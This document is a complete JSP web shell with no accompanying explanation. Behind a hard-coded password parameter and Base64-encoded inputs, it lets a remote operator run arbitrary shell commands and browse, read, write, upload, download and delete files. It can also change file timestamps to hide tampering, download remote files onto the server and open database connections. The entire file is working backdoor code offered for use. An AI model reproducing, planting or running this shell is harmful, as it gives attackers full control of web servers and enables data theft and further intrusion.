<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
	String Pwd = "a";
	String cs = "UTF-8";
	
	String EC(String s) throws Exception {
		return new String(s.getBytes("ISO-8859-1"),cs);
	}
	
	Connection GC(String s) throws Exception {
		String[] x = s.trim().split("\r\n");
		Class.forName(x[0].trim());
		if(x[1].indexOf("jdbc:oracle")!=-1){
			return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
		}else{
			Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
			if (x.length > 4) {
				c.setCatalog(x[4]);
			}
			return c;
		}
	}
	
	String WwwRootPathCode(HttpServletRequest r) throws Exception {
		String d = r.getSession().getServletContext().getRealPath("/");
		String s = d+"\t";
		if (!d.substring(0, 1).equals("/")) {
			File[] roots = File.listRoots();
			for (File file:roots) {
				s+=file.getPath().substring(0,2)+" ";
			}
		}
		else{
			s+="/";
		}
		return s;
	}
	
	String FileTreeCode(String dirPath) throws Exception {
		File oF = new File(dirPath), l[] = oF.listFiles();
		String s="",sT,sQ,sF="";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = 0; i < l.length; i++) {
			dt = new java.util.Date(l[i].lastModified());
			sT = fm.format(dt);
			sQ = l[i].canRead()?"R":"";
			sQ += l[i].canWrite()?" W":"";
			if (l[i].isDirectory()) {
				s+=l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";
			}else {
				sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";
			}
		}
		return s+=sF;
	}
	
	String ReadFileCode(String filePath) throws Exception {
		String l="",s="";
		BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath))));
		while ((l = br.readLine()) != null) {
				s+=l+"\r\n";
		}
		br.close();
		return s;
	}
	
	String WriteFileCode(String filePath,String fileContext) throws Exception {
		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(filePath))));
		bw.write(fileContext);
		bw.close();
		return "1";
	}
	
	String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
		File f = new File(fileOrDirPath);
		if (f.isDirectory()) {
			File x[] = f.listFiles();
			for (int k = 0; k < x.length; k++) {
				if (!x[k].delete()) {
					DeleteFileOrDirCode(x[k].getPath());
				}
			}
		}
		f.delete();
		return "1";
	}
	
	void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {
		int n;
		byte[] b = new byte[512];
		r.reset();
		ServletOutputStream os = r.getOutputStream();
		BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
		os.write(("->|").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("|<-").getBytes(), 0, 3);
		os.close();
		is.close();
	}
	
	String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
		String h = "0123456789ABCDEF";
		File f = new File(savefilePath);
		f.createNewFile();
		FileOutputStream os = new FileOutputStream(f);
		for (int i = 0; i < fileHexContext.length(); i += 2) {
			os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
		}
		os.close();
		return "1";
	}
	
	String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {
		File sf = new File(sourceFilePath), df = new File(targetFilePath);
		if (sf.isDirectory()) {
			if (!df.exists()) {
				df.mkdir();
			}
			File z[] = sf.listFiles();
			for (int j = 0; j < z.length; j++) {
				CopyFileOrDirCode(sourceFilePath+"/"+z[j].getName(),targetFilePath+"/"+z[j].getName());
			}
		} else {
			FileInputStream is = new FileInputStream(sf);
			FileOutputStream os = new FileOutputStream(df);
			int n;
			byte[] b = new byte[1024];
			while ((n = is.read(b, 0, 1024)) != -1) {
				os.write(b, 0, n);
			}
			is.close();
			os.close();
		}
		return "1";
	}
	
	String RenameFileOrDirCode(String oldName, String newName) throws Exception {
		File sf = new File(oldName), df = new File(newName);
		sf.renameTo(df);
		return "1";
	}
	
	String CreateDirCode(String dirPath) throws Exception {
		File f = new File(dirPath);
		f.mkdir();
		return "1";
	}
	
	String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {
		File f = new File(fileOrDirPath);
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		java.util.Date dt = fm.parse(aTime);
		f.setLastModified(dt.getTime());
		return "1";
	}
	
	String WgetCode(String urlPath, String saveFilePath) throws Exception {
		URL u = new URL(urlPath);
		int n = 0;
		FileOutputStream os = new FileOutputStream(saveFilePath);
		HttpURLConnection h = (HttpURLConnection) u.openConnection();
		InputStream is = h.getInputStream();
		byte[] b = new byte[512];
		while ((n = is.read(b)) != -1) {
			os.write(b, 0, n);
		}
		os.close();
		is.close();
		h.disconnect();
		return "1";
	}
	
	String SysInfoCode(HttpServletRequest r) throws Exception {
		String d = r.getSession().getServletContext().getRealPath("/");
		String serverName = r.getServerName();
		String serverInfo = getServletContext().getServerInfo();
		String separator = File.separator;
		return d+"\t"+serverName+"\t"+serverInfo+"\t"+separator;
	}
	
	String ExecuteCommandCode(String cmdPath, String command) throws Exception {
		StringBuffer sb = new StringBuffer("");
		String[] c = { cmdPath, File.separator=="/"?"-c":"/c", command };
		Process p = Runtime.getRuntime().exec(c);
		CopyInputStream(p.getInputStream(), sb);
		CopyInputStream(p.getErrorStream(), sb);
		return sb.toString();
	}
	
	String decode(String str){  
		byte[] bt = null;
		try {
			sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();  
			bt = decoder.decodeBuffer(str);
		}
		catch (IOException e){
			e.printStackTrace();
		}
        return new String(bt);  
    }
	
	void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
		String l;
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		while ((l = br.readLine()) != null) {
			sb.append(l + "\r\n");
		}
		br.close();
	}
%>
<%
	response.setContentType("text/html");
	response.setCharacterEncoding("utf-8");
	StringBuffer sb = new StringBuffer("");
	try {
		String fpar = decode(EC(request.getParameter(Pwd)+""));
		String[] tmp = decode(EC(request.getParameter(fpar)+"")).split(";");
		sb.append("->|");
		String[] pars = new String[tmp.length-1];
		for (int i = 1; i < tmp.length; i++) {
			pars[i-1] = decode(EC(request.getParameter(tmp[i])));
		}
		String funccode = tmp[0];
		
		if (funccode.equals("WwwRootPathCode")) {
			sb.append(WwwRootPathCode(request));
		} else if (funccode.equals("FileTreeCode")) {
			sb.append(FileTreeCode(pars[0]));
		} else if (funccode.equals("ReadFileCode")) {
			sb.append(ReadFileCode(pars[0]));
		} else if (funccode.equals("WriteFileCode")) {
			sb.append(WriteFileCode(pars[0],pars[1]));
		} else if (funccode.equals("DeleteFileOrDirCode")) {
			sb.append(DeleteFileOrDirCode(pars[0]));
		} else if (funccode.equals("DownloadFileCode")) {
			DownloadFileCode(pars[0], response);
		} else if (funccode.equals("UploadFileCode")) {
			sb.append(UploadFileCode(pars[0], pars[1]));
		} else if (funccode.equals("CopyFileOrDirCode")) {
			sb.append(CopyFileOrDirCode(pars[0], pars[1]));
		} else if (funccode.equals("RenameFileOrDirCode")) {
			sb.append(RenameFileOrDirCode(pars[0], pars[1]));
		} else if (funccode.equals("CreateDirCode")) {
			sb.append(CreateDirCode(pars[0]));
		} else if (funccode.equals("ModifyFileOrDirTimeCode")) {
			sb.append(ModifyFileOrDirTimeCode(pars[0], pars[1]));
		} else if (funccode.equals("WgetCode")) {
			sb.append(WgetCode(pars[0], pars[1]));
		} else if (funccode.equals("ExecuteCommandCode")) {
			sb.append(ExecuteCommandCode(pars[0], pars[1]));
		} else if (funccode.equals("SysInfoCode")) {
			sb.append(SysInfoCode(request));
		}
	} catch (Exception e) {
		sb.append("ERROR"+"://"+e.toString());
	}
	sb.append("|<-");
	out.print(sb.toString());
%>